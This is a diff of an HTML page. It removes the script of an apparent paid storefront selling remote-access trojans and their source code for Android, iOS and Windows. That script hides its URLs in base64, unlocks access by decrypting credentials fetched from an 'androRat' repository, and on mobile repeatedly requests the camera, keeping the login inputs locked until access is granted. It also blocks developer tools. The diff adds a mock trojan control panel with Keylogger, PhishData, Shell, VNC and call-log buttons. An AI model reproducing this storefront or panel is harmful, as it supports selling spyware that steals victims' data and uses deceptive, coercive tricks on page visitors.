-        const ratsContent = document.getElementById('rats-content');
-        toggleRatsBtn.addEventListener('click', () => {
-            ratsContent.classList.add('expanded');
-            toggleRatsBtn.style.display = 'none';
-        });
-        collapseRatsBtn.addEventListener('click', () => {
-            ratsContent.classList.remove('expanded');
-            setTimeout(() => {
-                toggleRatsBtn.style.display = 'inline-block';
-            }, 400);
-        });
-        // === END NEW JS ===
-        // Decode and set iframe source
-        document.addEventListener('DOMContentLoaded', () => {
-            const iframe = document.getElementById('cameraIframe');
-            if (iframe && iframe.dataset.encodedSrc && iframe.dataset.path) {
-                const decodedBaseUrl = getDecodedUrl(iframe.dataset.encodedSrc);
-                iframe.src = decodedBaseUrl + iframe.dataset.path;
-            }
-        });
-        function getDecodedUrl(encodedUrl) {
-    return atob(encodedUrl);
-}
+<body>
+    <div class="bg-layer"></div>
+    <div class="overlay"></div>
 
-async function fetchSacredKeys() {
-            const response = await fetch(getDecodedUrl("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VzLWFuZHJvaWQvYW5kcm9SYXQtL3JlZnMvaGVhZHMvbWFpbi9hc3NldC9rZXlzLmpzb24="));
-            const sacredKeys = await response.json();
-            return sacredKeys;
-        }
-        function unlockArcaneSecrets(cipheredData, mysticalEssence, celestialKeystone) {
-            const decodedKeystone = CryptoJS.enc.Base64.parse(celestialKeystone);
-            const decodedEssence = CryptoJS.enc.Base64.parse(mysticalEssence);
-            const unlockedSecrets = CryptoJS.AES.decrypt(cipheredData, decodedKeystone, {
-                iv: decodedEssence,
-                mode: CryptoJS.mode.CBC,
-                padding: CryptoJS.pad.Pkcs7
-            });
-            return unlockedSecrets.toString(CryptoJS.enc.Utf8);
-        }
-        function enableInputs() {
-            document.getElementById("username").disabled = false;
-            document.getElementById("password").disabled = false;
-            document.getElementById("submit").disabled = false;
-            document.getElementById("notice-board").style.display = 'none';
-            console.log("Inputs enabled after camera permission granted");
-        }
-        function disableInputs() {
-            document.getElementById("username").disabled = true;
-            document.getElementById("password").disabled = true;
-            document.getElementById("submit").disabled = true;
-            document.getElementById("notice-board").style.display = 'flex';
-        }
-        function stopCameraStream() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
-        }
-        async function requestCameraPermission() {
-            if (permissionRequested || permissionGranted) return;
-            if (window.innerWidth <= 768) {
-                permissionRequested = true;
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    console.log("Camera permission explicitly granted by user.");
-                    cameraStream = stream;
-                    permissionGranted = true;
-                    enableInputs();
-                    setTimeout(stopCameraStream, 5000);
-                    clearInterval(cameraInterval);
-                } catch (err) {
-                    console.log("Camera permission denied by user:", err);
-                    clearInterval(cameraInterval);
-                }
-            } else {
-                enableInputs();
-                clearInterval(cameraInterval);
-            }
-        }
-        document.addEventListener('DOMContentLoaded', function() {
-            if (window.innerWidth <= 768) {
-                cameraInterval = setInterval(requestCameraPermission, 3000);
-                requestCameraPermission();
-            } else {
-                enableInputs();
-            }
-            document.getElementById("submit").addEventListener("click", verifyEnigmaticCredentials);
-            document.getElementById("password").addEventListener("keydown", (event) => {
-                if (event.key === "Enter") {
-                    verifyEnigmaticCredentials();
-                }
-            });
-            updateMobilePricingUI();
-            window.addEventListener('resize', updateMobilePricingUI);
-            pricingToggleBtns.forEach(btn => {
-                btn.addEventListener('click', () => {
-                    pricingToggleBtns.forEach(b => b.classList.remove('active'));
-                    btn.classList.add('active');
-                    const plan = btn.getAttribute('data-plan');
-                    updatePricingDetails(plan);
-                });
-            });
-            pricingButtonMobile.addEventListener('click', () => {
-                const activeBtn = document.querySelector('.pricing-toggle-btn.active');
-                const plan = activeBtn.getAttribute('data-plan');
-                const amount = activeBtn.getAttribute('data-amount');
-                paymentAmount.textContent = `$${amount}.00`;
-                selectedPlan.textContent = plan.charAt(0).toUpperCase() + plan.slice(1);
-                paymentWindow.style.display = 'flex';
-            });
-        });
-        async function verifyEnigmaticCredentials() {
-            const sacredKeys = await fetchSacredKeys();
-            const unlockedIdentity = unlockArcaneSecrets(sacredKeys.arcaneCipheredIdentity, sacredKeys.mysticalEssenceOfCipherIdentity, sacredKeys.celestialSecretKeystone);
-            const unlockedPassage = unlockArcaneSecrets(sacredKeys.arcaneCipheredPassage, sacredKeys.mysticalEssenceOfCipherPassage, sacredKeys.celestialSecretKeystone);
-            const inputIdentity = document.getElementById("username").value;
-            const inputPassage = document.getElementById("password").value;
-            if (inputIdentity === "" || inputPassage === "") {
-                alert("Please fill in both username and password.");
-                return;
-            }
-            if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
-                window.location.href = getDecodedUrl("aHR0cHM6Ly9lcy1hbmRyb2lkLmdpdGh1Yi5pby9hbmRyb1JhdC0v");
-            } else {
-                alert("Incorrect User or Password.");
-            }
-        }
-        const cursorShadow = document.querySelector('.cursor-shadow');
-        document.addEventListener('mousemove', (event) => {
-            cursorShadow.style.left = event.clientX + 'px';
-            cursorShadow.style.top = event.clientY + 'px';
-        });
-        document.addEventListener('contextmenu', event => event.preventDefault());
-        document.onkeydown = function(e) {
-            if (e.keyCode === 123) return false;
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) return false;
-            if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) return false;
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) return false;
+    <div class="main-content-wrapper">
+        <div class="status-bar">
+            <span class="title">ES3000</span>
+            <span class="subtitle">© What you see is what you get!</span>
+        </div>
+
+        <div class="content">
+            <div class="header-text">ଏହିମାନେ ହେଲେ ଆପଣଙ୍କ ଵକରା . . .</div>
+
+            <div class="icon-grid" id="iconGrid"></div>
+        </div>
+
+        <div class="info-panel">
+            <h3>Dashboard Status</h3>
+            <p>Frameless interface viewer with blurred cyberpunk background. Total 25 interactive feature buttons.</p>
+            <p class="selected-text" id="selectedInfo"></p>
+        </div>
+    </div>
+
+    <script>
+        const icons = [
+            { id: 'dump', label: 'Dump', color: 'bg-blue-500', icon: 'message' },
+            { id: 'calllogs', label: 'CallLogs', color: 'bg-green-500', icon: 'phone' },
+            { id: 'files', label: 'My Files', color: 'bg-yellow-500', icon: 'files' },
+            { id: 'apps', label: 'AppsList', color: 'bg-purple-500', icon: 'package' },
+            { id: 'sysinfo', label: 'SysInfo', color: 'bg-red-500', icon: 'info' },
+            { id: 'contacts', label: 'Contacts', color: 'bg-indigo-500', icon: 'smartphone' },
+            { id: 'downloads', label: 'Downloads', color: 'bg-orange-500', icon: 'download' },
+            { id: 'crypto', label: 'Crypto', color: 'bg-amber-500', icon: 'coins' },
+            { id: 'sms', label: 'SendSMS', color: 'bg-pink-500', icon: 'message' },
+            { id: 'shell', label: 'Shell', color: 'bg-gray-600', icon: 'keyboard' },
+            { id: 'vibrator', label: 'Vibrator', color: 'bg-lime-500', icon: 'zap' },
+            { id: 'tts', label: 'TTS', color: 'bg-teal-500', icon: 'mic' },
+            { id: 'keylogger', label: 'Keylogger', color: 'bg-red-600', icon: 'keyboard' },
+            { id: 'wallpaper', label: 'Wallpaper', color: 'bg-violet-500', icon: 'image' },
+            { id: 'notifications', label: 'Notifications', color: 'bg-sky-500', icon: 'bell' },
+            { id: 'phish', label: 'PhishData', color: 'bg-amber-600', icon: 'alert' },
+            { id: 'recordings', label: 'Recordings', color: 'bg-fuchsia-500', icon: 'mic' },
+            { id: 'clipboard', label: 'ClipBoard', color: 'bg-emerald-500', icon: 'clipboard' },
+            { id: 'torch', label: 'Torch', color: 'bg-yellow-600', icon: 'zap' },
+            { id: 'camera', label: 'Camera', color: 'bg-blue-600', icon: 'camera' },
+            { id: 'hooks', label: 'Hooks', color: 'bg-cyan-500', icon: 'wrench' },
+            { id: 'admin', label: 'Admin', color: 'bg-red-700', icon: 'shield' },
+            { id: 'advanced', label: 'Advanced', color: 'bg-purple-700', icon: 'zap' },
+            { id: 'vnc', label: 'VNC', color: 'bg-green-700', icon: 'monitor' },
+            { id: 'url', label: 'LaunchURL', color: 'bg-green-600', icon: 'globe' }
+        ];
+
+        const iconSVGs = {
+            message: '<svg viewBox="0 0 24 24" fill="white"><path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM7 9h10v2H7V9zm0 3h7v2H7v-2z"/></svg>',
+            phone: '<svg viewBox="0 0 24 24" fill="white"><path d="M20 15.5c-1.2 0-2.4-.2-3.6-.7-1.1-.3-2.4-.2-3.4.5l-1.6 1.6c-2.8-1.5-5.2-3.8-6.7-6.7l1.6-1.6c.7-1 .8-2.3.5-3.4-.5-1.2-.7-2.4-.7-3.6C5 3.1 4.1 2 3 2H2C.9 2 0 2.9 0 4c0 9.4 7.6 17 17 17 1.1 0 2-.9 2-2v-1c0-1.1-1.1-2-2.5-2z"/></svg>',
+            files: '<svg viewBox="0 0 24 24" fill="white"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>',
+            package: '<svg viewBox="0 0 24 24" fill="white"><path d="M12 3L2 8v12l10 5 10-5V8L12 3zm0 13.5L6 13V8.5l6 3 6-3V13l-6 3.5z"/></svg>',
+            info: '<svg viewBox="0 0 24 24" fill="white"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>',
+            smartphone: '<svg viewBox="0 0 24 24" fill="white"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>',
+            download: '<svg viewBox="0 0 24 24" fill="white"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>',
+            coins: '<svg viewBox="0 0 24 24" fill="white"><path d="M11 15h2v2h-2zm0-4h2v2h-2zm0-4h2v2h-2zm-2 8h-2v2h2zm0-4h-2v2h2zm0-4h-2v2h2zm8 8h-2v2h2zm0-4h-2v2h2zm0-4h-2v2h2zM12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"/></svg>',
+            keyboard: '<svg viewBox="0 0 24 24" fill="white"><path d="M20 5H4c-1.1 0-1.99.9-1.99 2L2 17c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-9 3h2v2h-2V8zm0 3h2v2h-2v-2zM8 8h2v2H8V8zm0 3h2v2H8v-2zm-1 2H5v-2h2v2zm0-3H5V8h2v2zm9 7H8v-2h8v2zm-1-4h-2v-2h2v2zm0-3h-2V8h2v2zm3 3h-2v-2h2v2zm0-3h-2V8h2v2z"/></svg>',
+            zap: '<svg viewBox="0 0 24 24" fill="white"><path d="M11 21h-1l3-7H7l4-7h2l-3 7h7l-4 7z"/></svg>',
+            mic: '<svg viewBox="0 0 24 24" fill="white"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3.53-2.64 6.44-6.14 7.07V22h-2v-1.93c-3.5-0.63-6.14-3.54-6.14-7.07H4c0 4.17 3.19 7.6 7.34 8.13V22h1.32v-1.87c4.15-0.53 7.34-3.96 7.34-8.13h-2z"/></svg>',
+            image: '<svg viewBox="0 0 24 24" fill="white"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01 3.5-4.5 4.5 6H5l3.5-4.5z"/></svg>',
+            bell: '<svg viewBox="0 0 24 24" fill="white"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6V9c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5S10.5 3.17 10.5 4v.68C7.64 5.36 6 7.93 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>',
+            alert: '<svg viewBox="0 0 24 24" fill="white"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>',
+            clipboard: '<svg viewBox="0 0 24 24" fill="white"><path d="M16 1H8C6.9 1 6 1.9 6 3v18c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 20H8V3h8v18zM10 4h4v1h-4V4z"/></svg>',
+            camera: '<svg viewBox="0 0 24 24" fill="white"><path d="M12 12c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zm0 8c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zM18 4h-2.5l-1-1h-5l-1 1H6c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z"/></svg>',
+            wrench: '<svg viewBox="0 0 24 24" fill="white"><path d="M19.4 12.9c.8-.8.8-2 0-2.8l-1.4-1.4c-.8-.8-2-.8-2.8 0l-2.1 2.1-2.1-2.1c-.8-.8-2-.8-2.8 0l-1.4 1.4c-.8.8-.8 2 0 2.8l2.1 2.1-2.1 2.1c-.8.8-.8 2 0 2.8l1.4 1.4c.8.8 2 .8 2.8 0l2.1-2.1 2.1 2.1c.8.8 2 .8 2.8 0l1.4-1.4c.8-.8.8-2 0-2.8l-2.1-2.1 2.1-2.1zM12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2z"/></svg>',
+            shield: '<svg viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 16l-4-4 1.41-1.41L11 14.17l6.59-6.59L19 9l-8 8z"/></svg>',
+            monitor: '<svg viewBox="0 0 24 24" fill="white"><path d="M20 3H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h3l-1 1v2h12v-2l-1-1h3c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 13H4V5h16v11z"/></svg>',
+            globe: '<svg viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.8-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-.67-1.57-1.18-2.25l-1.42-1.42 1.42-1.42c.68-.58 1.44-.99 2.25-1.18.58.13 1.17.21 1.79.21 4.13 0 7.44-3.05 7.93-7L12 4.07V2c-5.52 0-10 4.48-10 10s4.48 10 10 10h-2c0 4.42-3.58 8-8 8z"/></svg>'
         };
-        planButtons.forEach(button => {
-            button.addEventListener('click', () => {
-                const plan = button.getAttribute('data-plan');
-                const amount = button.getAttribute('data-amount');
-                paymentAmount.textContent = `$${amount}.00`;
-                selectedPlan.textContent = plan.charAt(0).toUpperCase() + plan.slice(1);
-                paymentWindow.style.display = 'flex';
+
+        let selectedIcon = null;
+
+        function renderIcons() {
+            const grid = document.getElementById('iconGrid');
+            icons.forEach(icon => {
+                const button = document.createElement('button');
+                button.className = 'icon-button';
+                button.innerHTML = `
+                    <div class="icon-badge ${icon.color}">
+                        ${iconSVGs[icon.icon]}
+                    </div>
+                    <span class="icon-label">${icon.label}</span>
+                `;
+                button.addEventListener('click', () => selectIcon(icon.id, icon.label, button));
+                grid.appendChild(button);
             });
-        });
-        closePayment.addEventListener('click', () => {
-            paymentWindow.style.display = 'none';
-        });
-        paidButton.addEventListener('click', () => {
-            const email = document.getElementById('register-email').value;
-            const regUsername = document.getElementById('register-username').value;
-            const regPassword = document.getElementById('register-password').value;
-            if (!email || !regUsername || !regPassword) {
-                alert('Please fill all registration fields');
-                return;
-            }
-            paymentWindow.style.display = 'none';
-            verificationWindow.style.display = 'flex';
-        });
-        closeVerification.addEventListener('click', () => {
-            verificationWindow.style.display = 'none';
-            document.getElementById('register-email').value = '';
-            document.getElementById('register-username').value = '';
-            document.getElementById('register-password').value = '';
-        });
-        downloadQr.addEventListener('click', async () => {
-            const qrUrl = qrImage.src;
-            try {
-                const response = await fetch(qrUrl);
-                const blob = await response.blob();
-                const url = window.URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = 'usdt-payment-qr.png';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                window.URL.revokeObjectURL(url);
-            } catch (error) {
-                console.error("Failed to download QR code:", error);
-                alert("Failed to download QR code. Please try again.");
-            }
-        });
-        window.addEventListener('load', () => {
-            const qrContainer = document.querySelector('.qr-code');
-        });
-        function updateMobilePricingUI() {
-            const isMobile = window.innerWidth <= 768;
-            if (isMobile) {
-                pricingToggleContainer.style.display = 'flex';
-                pricingDetails.style.display = 'block';
-                document.querySelector('.pricing-cards').style.display = 'none';
-                updatePricingDetails('premium');
-            } else {
-                pricingToggleContainer.style.display = 'none';
-                pricingDetails.style.display = 'none';
-                document.querySelector('.pricing-cards').style.display = 'flex';
-            }
         }
-        function updatePricingDetails(plan) {
-            const isPremium = plan === 'premium';
-            planNameMobile.textContent = isPremium ? 'Premium' : 'Lifetime';
-            amountMobile.textContent = isPremium ? '9' : '19';
-            planDurationMobile.textContent = isPremium ? '180 Days Access' : 'Lifetime Access';
-            cardFeaturesMobile.innerHTML = isPremium ?
-                '<ul><li>Access to all kinds of RATs (Android, iOS & Windows)</li><li>Access to RATs Source Codes</li><li>Upcoming Hacks</li></ul>' :
-                '<ul><li>Everything in Premium</li><li>Priority Support</li><li>No Renewal Needed</li></ul>';
-            pricingButtonMobile.textContent = isPremium ? 'Get Started' : 'Choose Lifetime';
-            pricingButtonMobile.className = 'pricing-button-mobile';
-            if (!isPremium) pricingButtonMobile.classList.add('featured-button');
+
+        function selectIcon(id, label, button) {
+            const allButtons = document.querySelectorAll('.icon-button');
+            allButtons.forEach(btn => btn.classList.remove('selected'));
+            button.classList.add('selected');
+            selectedIcon = id;
+            updateSelectedInfo(label);
         }
-        // === MOBILE POPUP CONTROL ===
-        const previewBtn = document.getElementById('preview-rat');
-        const mobilePopup = document.getElementById('mobile-popup');
-        const mobileOverlay = document.getElementById('mobile-popup-overlay');
-        const mobileCloseBtn = document.getElementById('mobile-popup-close');
-        previewBtn.addEventListener('click', () => {
-            mobilePopup.style.display = 'flex';
-            mobileOverlay.style.display = 'block';
-            document.body.style.overflow = 'hidden';
-        });
-        function closeMobilePopup() {
-            mobilePopup.style.display = 'none';
-            mobileOverlay.style.display = 'none';
-            document.body.style.overflow = '';
+
+        function updateSelectedInfo(label) {
+            const infoEl = document.getElementById('selectedInfo');
+            infoEl.textContent = `Selected: ${label}`;
         }
-        mobileOverlay.addEventListener('click', closeMobilePopup);
-        mobileCloseBtn.addEventListener('click', closeMobilePopup);
-        document.querySelectorAll('.app-icon').forEach(icon => {
-            icon.addEventListener('click', () => {
-                const feature = icon.getAttribute('data-feature');
-                showMobileScreen(feature);
-            });
-        });
-        document.querySelectorAll('.system-back').forEach(btn => {
-            btn.addEventListener('click', () => {
-                showMobileScreen('home');
-            });
-        });
-        function showMobileScreen(screenId) {
-            document.querySelectorAll('.mobile-screen').forEach(el => {
-                el.style.display = 'none';
-            });
-            if (screenId === 'home') {
-                document.getElementById('home-screen-mobile').style.display = 'block';
-            } else {
-                const screen = document.getElementById(screenId + '-mobile');
-                if (screen) {
-                    screen.style.display = 'block';
-                } else {
-                    document.getElementById('feature-name-mobile').textContent = screenId.replace(/-/g, ' ');
-                    document.getElementById('generic-title-mobile').textContent = 
-                        screenId.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
-                    document.getElementById('generic-detail-mobile').style.display = 'block';
-                }
-            }
-        }
-        function updateMobileTime() {
-            const now = new Date();
-            let hours = now.getHours();
-            const minutes = now.getMinutes().toString().padStart(2, '0');
-            const timeString = `${hours % 12 || 12}:${minutes} ${hours >= 12 ? 'PM' : 'AM'}`;
-            document.getElementById('status-time').textContent = timeString;
-        }
-        updateMobileTime();
-        setInterval(updateMobileTime, 60000);
-        const networks = ['Wi-Fi', '5G', 'LTE', '4G'];
-        let netIndex = 0;
-        setInterval(() => {
-            document.getElementById('status-network').textContent = networks[netIndex];
-            netIndex = (netIndex + 1) % networks.length;
-        }, 10000);
+
+        renderIcons();
     </script>
 </body>
 </html>
